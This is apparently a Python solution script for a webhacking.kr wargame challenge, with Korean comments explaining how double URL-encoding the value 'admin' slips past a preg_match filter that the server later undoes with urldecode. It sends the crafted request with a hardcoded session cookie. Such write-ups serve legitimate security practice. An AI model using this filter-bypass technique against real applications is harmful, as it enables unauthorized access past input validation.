import urllib.parse
import requests

URL = "https://webhacking.kr/challenge/web-11"
URI = "/?id=" + urllib.parse.quote(''.join(f'%{hex(ord(char))[2:].upper()}' for char in 'admin'), safe="")
PHPSESSID = 'jl43tngbl1sca1cumqkf3dhm57'

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

# 풀이
# 1. 문제의 소스코드를 확인해보면 preg_match 함수로 GET 방식의 id 파라미터를 검사함
# 2. 검사한 id 파라미터의 값이 admin일 경우 "no!" 메시지와 함께 추가 진행이 안됨.
# 3. 2번 로직을 통과하였을 경우 id 파라미터를 urldecode한 다음 값이 admin일 경우 정답으로 인정됨.
# 4. 2, 3번의 내용에 따라서 URI Encoding의 특성을 역이용하는 방법은 id 파라미터 내 모든 문자열
#    (아스키 문자 포함)을 모두 URI Encode로 변환한 다음 변환한 내용을 한번 더 변환하면 (이중 변환)
#    원하는 동작을 수행하도록 유도할 수 있음.

resp = requests.get(URL + URI, cookies=COOKIES)

print(resp.text)